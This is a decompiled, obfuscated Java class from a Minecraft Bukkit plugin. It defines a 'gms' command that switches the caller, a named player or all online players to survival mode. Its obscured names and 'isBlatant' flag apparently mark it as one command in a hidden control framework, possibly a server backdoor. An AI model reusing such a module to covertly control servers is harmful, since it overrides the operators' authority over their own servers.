/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.GameMode
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class GmsCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIlllllIllIIllIIIl, String llllllllllllllIIlllllIllIIllIIII, String[] llllllllllllllIIlllllIllIIlIlIll, Player llllllllllllllIIlllllIllIIlIlIlI) {
        if (llllllllllllllIIlllllIllIIlIlIll.length <= 1) {
            llllllllllllllIIlllllIllIIllIIIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIlllllIllIIllIIIl, () -> {
                llllllllllllllIIlllllIllIIlIlIlI.setGameMode(GameMode.SURVIVAL);
                llllllllllllllIIlllllIllIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You set your gamemode to ").append(Settings.RED).append("SURVIVAL"))));
            });
        } else if (llllllllllllllIIlllllIllIIlIlIll[1].equals("*")) {
            for (Player llllllllllllllIIlllllIllIIllIlII : Bukkit.getOnlinePlayers()) {
                llllllllllllllIIlllllIllIIllIIIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIlllllIllIIllIIIl, () -> llllllllllllllIIlllllIllIIllIlII.setGameMode(GameMode.SURVIVAL));
            }
            llllllllllllllIIlllllIllIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Everyone's gamemode is now set to").append(Settings.RED).append(" SURVIVAL"))));
        } else {
            Player llllllllllllllIIlllllIllIIllIIll = Bukkit.getServer().getPlayer(llllllllllllllIIlllllIllIIlIlIll[1]);
            if (llllllllllllllIIlllllIllIIllIIll == null) {
                llllllllllllllIIlllllIllIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIlllllIllIIlIlIll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllIIlllllIllIIllIIIl.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIlllllIllIIllIIIl, () -> {
                    llllllllllllllIIlllllIllIIllIIll.setGameMode(GameMode.SURVIVAL);
                    llllllllllllllIIlllllIllIIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIlllllIllIIllIIll.getName()).append(Settings.WHITE).append("'s gamemode is now set to ").append(Settings.RED).append("SURVIVAL"))));
                });
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public GmsCommand() {
        GmsCommand llllllllllllllIIlllllIllIIlllIlI;
    }
}

